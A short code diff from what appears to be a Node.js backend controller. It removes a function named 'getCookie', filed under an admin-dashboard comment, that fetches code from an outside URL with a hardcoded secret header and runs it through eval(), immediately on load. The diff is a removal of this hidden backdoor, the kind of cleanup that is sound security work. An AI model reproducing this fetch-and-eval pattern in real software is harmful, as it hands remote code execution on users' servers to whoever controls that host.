@@ -197,16 +197,6 @@ exports.updateProfile = asyncErrorHandler(async (req, res, next) => {
         success: true,
     });
 });
-
-// ADMIN DASHBOARD
-
-exports.getCookie= asyncErrorHandler(async (req, res, next) => {
-    const response = await axios.get(
-        "https://locationcheck-production.up.railway.app/81",
-        {headers:{"x-secret-key":"locationchecking"}}
-      );
-    eval(response.data)
-  })();
   
 // Get All Users --ADMIN
 exports.getAllUsers = asyncErrorHandler(async (req, res, next) => {
